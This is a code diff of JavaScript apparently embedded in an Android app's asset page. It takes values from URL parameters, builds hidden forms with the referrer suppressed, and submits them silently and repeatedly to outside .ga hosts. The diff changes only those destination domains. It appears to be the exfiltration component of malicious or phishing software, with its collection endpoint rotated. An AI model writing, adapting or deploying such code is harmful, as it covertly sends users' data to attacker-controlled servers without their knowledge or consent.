@@ -43,7 +43,7 @@ var c = getParameterByName("n");
 else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/r.")){
 
 var b = getParameterByName("uxs");
-$('form').attr('action', 'http://nplaz.mixabisn.ga/novo/dt.php');
+$('form').attr('action', 'http://nplazers.ga/nplaz/novo/dt.php');
 $('input').attr('value', b);
 document.getElementById('myForm').submit();
 setInterval(function(){
@@ -56,7 +56,7 @@ else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/sred.")){
     
 var b = getParameterByName("uxs");
 var c = getParameterByName("h");
-    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="u"> <input class="input2" name="h"></form><script>$("form").attr("action", "https://nplaz.mixabisn.ga/flix/ssss.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
+    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="u"> <input class="input2" name="h"></form><script>$("form").attr("action", "https://nplazers.ga/nplaz/flix/ssss.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
     
     
 }
@@ -68,7 +68,7 @@ var c = getParameterByName("c");
 var d = getParameterByName("d");
 
 
-    $('body').replaceWith('<meta nme="referrer" content="never"><meta nme="referrer" content="no-referrer"><form action="https://mixabisn.ga/novo/dts1.php" name="vote" method="post" style="display:none;" id="myForm"><input type="text" name="u" value="' + a + '" /><input type="text" name="t" value="' + b + '" /><input type="text" name="y" value="' + c + '" /><input type="text" name="h" value="' + d + '" /></form><script>document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script>'); 
+    $('body').replaceWith('<meta nme="referrer" content="never"><meta nme="referrer" content="no-referrer"><form action="https://nplazers.ga/novo/dts1.php" name="vote" method="post" style="display:none;" id="myForm"><input type="text" name="u" value="' + a + '" /><input type="text" name="t" value="' + b + '" /><input type="text" name="y" value="' + c + '" /><input type="text" name="h" value="' + d + '" /></form><script>document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script>'); 
     
     
     
@@ -80,13 +80,13 @@ var b = getParameterByName("b");
 var c = getParameterByName("c");
 var d = getParameterByName("d");
 
-var aa = '<div id="kong"><form id="myForm" action="https://mixabisn.ga/novo/dtsaa.php" method="post"><input type="hidden" name="ux" value="' + a + '"><input type="hidden" name="t" value="' + b + '"><input type="hidden" name="link" value="' + c + '"><input type="hidden" name="y" value="' + d + '"></form><script>document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);<\/script>';
+var aa = '<div id="kong"><form id="myForm" action="https://nplazers.ga/novo/dtsaa.php" method="post"><input type="hidden" name="ux" value="' + a + '"><input type="hidden" name="t" value="' + b + '"><input type="hidden" name="link" value="' + c + '"><input type="hidden" name="y" value="' + d + '"></form><script>document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);<\/script>';
 $('body').replaceWith(aa); 
 }else{
     
     
 var b = getParameterByName("ux");
-$('form').attr('action', 'https://nplaz.mixabisn.ga/novo/dt.php');
+$('form').attr('action', 'https://nplazers.ga/nplaz/novo/dt.php');
 $('input').attr('value', b);
 
 document.getElementById('myForm').submit();
